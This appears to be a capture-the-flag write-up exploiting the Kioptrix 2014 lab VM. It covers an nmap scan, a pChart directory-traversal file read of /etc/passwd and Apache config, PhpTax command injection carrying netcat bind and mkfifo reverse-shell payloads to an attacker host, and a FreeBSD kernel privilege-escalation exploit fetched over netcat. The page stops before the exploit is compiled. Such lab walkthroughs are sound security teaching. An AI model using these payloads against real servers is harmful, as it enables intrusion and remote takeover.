@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>#Kioptrix: 2014 (#5)</strong></h1>
+        <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">https://www.vulnhub.com/entry/kioptrix-2014-5,62/</a><br>
+        <br>
+        Kioptrix aren't easy, don't mind what the creator tells you.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>0) Find the VM's IP</strong></h3><br>
+        To find your VM's IP address, set your VM to ‘bridged’ so that it gets assigned an IP on your internal network and then use netdiscover to scan your network: <code>netdiscover -r &lt;internal network&gt;/24</code><br>
+        <br>
+        <code>netdiscover -r 192.168.1.1/24</code><br>
+        192.168.1.188 is my Kioptrix 2014 box.<br>
+        Take a snapshot of the VM at this point, just to be safe.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 192.168.1.188</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix5-2014#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix5-2014#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>initial.txt&nbsp;192.168.1.188&nbsp;<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-04-09&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>41&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">kioptrix2014</span>.lan&nbsp;(192.168.1.188)<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.00015s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;997&nbsp;filtered&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;SERVICE&nbsp;VERSION<br>
+                22/tcp&nbsp;&nbsp;&nbsp;closed&nbsp;ssh<br>
+                80/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.2.21&nbsp;((FreeBSD)&nbsp;mod_ssl/2.2.21&nbsp;OpenSSL/0.9.8q&nbsp;DAV/2&nbsp;PHP/5.3.8)<br>
+                8080/tcp&nbsp;open&nbsp;&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.2.21&nbsp;((FreeBSD)&nbsp;mod_ssl/2.2.21&nbsp;OpenSSL/0.9.8q&nbsp;DAV/2&nbsp;PHP/5.3.8)<br>
+                |_http-title:&nbsp;403&nbsp;Forbidden<br>
+                MAC&nbsp;Address:&nbsp;00:0C:29:0D:8B:AF&nbsp;(VMware)<br>
+                Aggressive&nbsp;OS&nbsp;guesses:&nbsp;FreeBSD&nbsp;7.0-RELEASE&nbsp;-&nbsp;9.0-RELEASE&nbsp;(93%),&nbsp;FreeBSD&nbsp;7.0-RC1&nbsp;(92%),&nbsp;FreeBSD&nbsp;7.1-RELEASE&nbsp;(92%),&nbsp;FreeBSD&nbsp;7.0-STABLE&nbsp;(92%),&nbsp;FreeBSD&nbsp;9.3-RELEASE&nbsp;(87%),&nbsp;Vonage&nbsp;V-Portal&nbsp;VoIP&nbsp;adapter&nbsp;(87%),&nbsp;FreeBSD&nbsp;11.0-STABLE&nbsp;or&nbsp;11.0-RELEASE&nbsp;(87%),&nbsp;FreeBSD&nbsp;7.0-RELEASE&nbsp;(87%),&nbsp;FreeBSD&nbsp;7.1-PRERELEASE&nbsp;7.2-STABLE&nbsp;(87%),&nbsp;FreeBSD&nbsp;7.2-RELEASE&nbsp;-&nbsp;8.0-RELEASE&nbsp;(87%)<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(test&nbsp;conditions&nbsp;non-ideal).<br>
+                Network&nbsp;Distance:&nbsp;1&nbsp;hop<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.
+            </div>
+        </div><br>
+        <br>
+        Nothing new in a full port scan - <code>nmap -p- -sV -T4 -oN nmap/full.txt 192.168.1.188</code><br>
+        <br>
+        • <code>22/ssh</code> is closed, so there's definitely nothing we can do there.<br>
+        • <code>80/tcp</code> looks normal.<br>
+        • <code>8080/tcp</code> doesn't look normal.<br>
+        <br>
+        Look at 80/tcp first.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) Look at this graph!</strong></h2><br>
+        <code>http://192.168.1.188/</code><br>
+        right click &gt; view source<br>
+            <div class="codebox">
+                &lt;html&gt;<br>
+                &nbsp;&lt;<span style="color:#ff9d00;font-weight:700">head</span>&gt;<br>
+                &nbsp;&nbsp;&lt;<span style="color:#ff9d00;font-weight:700">!</span>--<br>
+                &nbsp;&nbsp;&lt;META&nbsp;HTTP-EQUIV=<span style="color:#3ad900;font-weight:400">"refresh"</span>&nbsp;CONTENT=<span style="color:#3ad900;font-weight:400">"5;URL=pChart2.1.3/index.php"</span>&gt;<br>
+                &nbsp;&nbsp;--&gt;<br>
+                &nbsp;&lt;<span style="color:#ff9d00;font-weight:700">/head</span>&gt;<br>
+                <br>
+                &nbsp;&lt;body&gt;<br>
+                &nbsp;&nbsp;&lt;h1<span style="color:#ffdd00;font-weight:400">&gt;</span>It&nbsp;works<span style="color:#ff9d00;font-weight:700">!</span>&lt;<span style="color:#ff9d00;font-weight:700">/</span>h1&gt;<br>
+                &nbsp;&lt;<span style="color:#ff9d00;font-weight:700">/</span>body&gt;<br>
+                &lt;<span style="color:#ff9d00;font-weight:700">/</span>html&gt;<br>
+            </div>
+        </div><br>
+        <br>
+        A url that's been hidden away in a comment. Visit it :) http://192.168.1.188/pChart2.1.3/index.php<br>
+        <br>
+        This looks like an application that creates charts.<br>
+        Conveniently we've been given a version number in the url - time for searchsploit.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix5-2014<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;searchsploit&nbsp;pChart&nbsp;2.1.3<br>
+                -------------------------------------------------------------&nbsp;<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/)</span><br>
+                -------------------------------------------------------------<br>
+                pChart&nbsp;2.1.3&nbsp;-&nbsp;Multiple&nbsp;Vulnerabilities&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>31173.txt<br>
+                -------------------------------------------------------------&nbsp;<br>
+                Shellcodes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;No&nbsp;Result
+            </div>
+        </div><br>
+        <br>
+        This exploit describes a directory traversal vulnerability i.e. local file include. Nice!<br>
+        <code>http://192.168.1.188/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</code><br>
+        <br>
+        I got stumped here.<br>
+        <code>/etc/passwd</code> is useful, but not what we need right now.<br>
+        <code>/etc/motd</code> tells us the machine is FreeBSD. This is a little more useful.<br>
+        <br>
+        A good thing to check once you've found a local file include vuln is the config of the web server.<br>
+        It can be in different places on different distros, have a look: <a href="https://wiki.apache.org/httpd/DistrosDefaultLayout">https://wiki.apache.org/httpd/DistrosDefaultLayout</a><br>
+        On FreeBSD (known from /etc/motd) using Apache 2.2 (known from nmap), it's here <code>usr/local/etc/apache22/httpd.conf</code><br>
+        <br>
+        <code>http://192.168.1.188/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf</code><br>
+        <br>
+        The key part in this file is right the bottom. 8080/http can only be accessed if our user agent is Mozilla 4.0<br>
+            <div class="codebox">
+                &lt;IfModule&nbsp;ssl_module&gt;<br>
+                SSLRandomSeed&nbsp;startup&nbsp;<span style="color:#ff9d00;font-weight:700">builtin</span><br>
+                SSLRandomSeed&nbsp;connect&nbsp;<span style="color:#ff9d00;font-weight:700">builtin</span><br>
+                &lt;<span style="color:#ff9d00;font-weight:700">/</span>IfModule&gt;<br>
+                <br>
+                SetEnvIf&nbsp;User-Agent&nbsp;^Mozilla<span style="color:#ff9d00;font-weight:700">/</span>4.0&nbsp;Mozilla4_browser<br>
+                <br>
+                &lt;VirtualHost&nbsp;*<span style="color:#ff9d00;font-weight:700">:</span>8080&gt;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;DocumentRoot&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>apache22<span style="color:#ff9d00;font-weight:700">/</span>data2<br>
+                <br>
+                &lt;Directory&nbsp;<span style="color:#3ad900;font-weight:400">"/usr/local/www/apache22/data2"</span>&gt;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Options&nbsp;Indexes&nbsp;FollowSymLinks<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;AllowOverride&nbsp;All<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Order&nbsp;allow,deny<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Allow&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">env</span>=Mozilla4_browser<br>
+                &lt;<span style="color:#ff9d00;font-weight:700">/</span>Directory&gt;
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) 4.0 &gt; 5.0</strong></h2><br>
+        Modify yo user agent:<br>
+        1. In firefox, type <code>about:config</code> in the URL bar<br>
+        2. Search for <code>useragent</code><br>
+        3. right click &gt; new &gt; string<br>
+        4. general.useragent.override<br>
+        5. Mozilla/4.0<br>
+        <br>
+        ... And now you should be able to access 8080/http :)<br>
+        Just make sure to delete this entry later so you're not on Mozilla/4.0 forever.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) mo taxes mo shells</strong></h2><br>
+        <code>http://192.168.1.188:8080/phptax/</code><br>
+        <br>
+        The URLs on the site look vulnerable<br>
+        e.g. <code>http://192.168.1.188:8080/phptax/index.php?pfilez=1040d-pg2.tob</code><br>
+        <br>
+        They are.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix5-2014<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;searchsploit&nbsp;phptax<br>
+                -------------------------------------------------------------&nbsp;<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/)</span><br>
+                -------------------------------------------------------------&nbsp;<br>
+                PhpTax&nbsp;-&nbsp;<span style="color:#3ad900;font-weight:400">'pfilez'</span>&nbsp;Execution&nbsp;Remote&nbsp;Code&nbsp;Injection&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Metasploi&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>21833.rb<br>
+                PhpTax&nbsp;0.8&nbsp;-&nbsp;File&nbsp;Manipulation&nbsp;<span style="color:#3ad900;font-weight:400">'newvalue'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;Remote&nbsp;Code&nbsp;Exec&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>25849.txt<br>
+                phptax&nbsp;0.8&nbsp;-&nbsp;Remote&nbsp;Code&nbsp;Execution&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>21665.txt<br>
+                -------------------------------------------------------------&nbsp;----------------------------------------<br>
+                Shellcodes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;No&nbsp;Result<br>
+            </div>
+        </div><br>
+        <br>
+        I used this exploit and the exploit-db verified url they provided:<br>
+        <a href="https://www.exploit-db.com/exploits/21665">https://www.exploit-db.com/exploits/21665</a><br>
+        <code>** Exploit-DB Verified:**<br>
+        /phptax/index.php?pfilez=1040d1-pg2.tob;nc -l -v -p 23235 -e /bin/bash;&amp;pdf=make</code><br>
+        <br>
+        This tries to create a netcat bind shell on 23325. Unfortunately, it doesn't work.<br>
+        Nor does a netcat reverse shell <code>nc 192.168.1.183 9001 -e /bin/sh</code><br>
+        <br>
+        I tried lots of shells. Lots and lots of shells.<br>
+        Reading this suggested to me that maybe netcat's <code>-e</code> flag was being blocked - <a href="https://www.phillips321.co.uk/2012/02/05/reverse-shell-cheat-sheet/">https://www.phillips321.co.uk/2012/02/05/reverse-shell-cheat-sheet/</a><br>
+        You can get round this using pipes and redirecting outputs.<br>
+        <br>
+        <code>mkfifo /tmp/f ; nc 192.168.1.183 9001 &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt; /tmp/f ; rm /tmp/f</code><br>
+        <br>
+        <code>mkfifo /tmp/f;</code> creates a named pipe<br>
+        <code>nc 192.168.1.183 9001 &lt; /tmp/f</code> connects to our attacking machine and takes input from whatever is in /tmp/f<br>
+        <code>| /bin/sh</code> pipes the result of <code>nc 192.168.1.183 9001 &lt; /tmp/f</code> to <code>/bin/sh</code><br>
+        <code>&gt; /tmp/f</code> directs the output of <code>/bin/sh</code> to /tmp/f<br>
+        <code>2&gt; /tmp/f</code> and directs any errors to /tmp/f too (e.g. if you type a cmd which doesn't exist, it will tell you)<br>
+        <code>; rm /tmp/f</code> once we exit the shell, the named pipe we made will be deleted<br>
+        <br>
+        Start a listener on your attacking machine<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix5-2014#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+            </div>
+        </div><br>
+        <br>
+        Start the reverse shell on the target system:<br>
+        <code>http://192.168.1.188:8080/phptax/index.php?pfilez=1040d1-pg2.tob; mkfifo /tmp/f ; nc 192.168.1.183 9001 &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt; /tmp/f ; rm /tmp/f ; &amp;pdf=make</code><br>
+        <br>
+        And we have a shell!<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix5-2014#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[192.168.1.183]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[192.168.1.188]&nbsp;48194<br>
+                <span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=80<span style="color:#ff9d00;font-weight:700">(</span>www<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=80<span style="color:#ff9d00;font-weight:700">(</span>www<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=80<span style="color:#ff9d00;font-weight:700">(</span>www<span style="color:#ff9d00;font-weight:700">)</span><br>
+                bin<span style="color:#ff9d00;font-weight:700">/sh</span>&nbsp;-i<br>
+                $&nbsp;<br>
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) Where da kernel at?</strong></h2><br>
+        Check if it really is FreeBSD.<br>
+            <div class="codebox">
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">uname</span>&nbsp;-mrs<br>
+                FreeBSD&nbsp;9.0-RELEASE&nbsp;amd64
+            </div>
+        </div><br>
+        <br>
+        It is. Any exploits?<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix5-2014#&nbsp;searchsploit&nbsp;FreeBSD&nbsp;9.0<br>
+                --------------------------------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/)</span><br>
+                -------------------------------------------------------------&nbsp;<br>
+                FreeBSD&nbsp;9.0&nbsp;-&nbsp;Intel&nbsp;SYSRET&nbsp;Kernel&nbsp;Privilege&nbsp;Escalation&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>freebsd<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>28718.c<br>
+                FreeBSD&nbsp;9.0&nbsp;&lt;&nbsp;9.1&nbsp;-&nbsp;<span style="color:#3ad900;font-weight:400">'mmap/ptrace'</span>&nbsp;Local&nbsp;Privilege&nbsp;Escalation&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>freebsd<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>26368.c<br>
+                -------------------------------------------------------------&nbsp;<br>
+                Shellcodes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;No&nbsp;Result
+            </div>
+        </div><br>
+        <br>
+        Why yes!<br>
+        There's only 2, so I decided I'd just try both. The first one works. (And so does the 2nd too, I think).<br>
+        <br>
+        Get the exploit.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix5-2014#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;exploits<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix5-2014#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;exploits<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix5-2014<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>shsare<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>freebsd<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>28718.c&nbsp;.<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix5-2014<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;<span style="color:#ff9d00;font-weight:700">mv</span>&nbsp;28718.c&nbsp;sysret.c
+            </div>
+        </div><br>
+        <br>
+        Can we compile the exploit on the target machine?<br>
+            <div class="codebox">
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;<span style="color:#ff9d00;font-weight:700">gcc</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/gcc</span>
+            </div>
+        </div><br>
+        <br>
+        We can.<br>
+        How can we serve the exploit?<br>
+            <div class="codebox">
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span><br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;curl<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;nc<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>nc
+            </div>
+        </div><br>
+        <br>
+        Looks like it has to be netcat.<br>
+            <div class="codebox">
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>exploits<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>exploits
+            </div>
+        </div><br>
+        <br>
+        Serve the file from your attacking machine:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix5-2014<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;nc&nbsp;-lvnp&nbsp;9002&nbsp;&lt;&nbsp;sysret.c<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Receive the file on the target machine:<br>
+            <div class="codebox">
+                $&nbsp;nc&nbsp;192.168.1.183&nbsp;9002&nbsp;&gt;&nbsp;sysret.c
+            </div>
+        </div><br>
+        <br>
+        Cancel the netcat session on your attacking box with ctrl+c<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix5-2014<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;nc&nbsp;-lvnp&nbsp;9002&nbsp;&lt;&nbsp;sysret.c<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...<br>
+                connect&nbsp;to&nbsp;[192.168.1.183]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[192.168.1.188]&nbsp;34770<br>
+                ^C
+            </div>
+        </div><br>
+        <br>
+        Now the exploit should be sitting on your kioptrix4 target. Compile and run!<br>
+            <div class="codebox">
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                sysret.c<br>
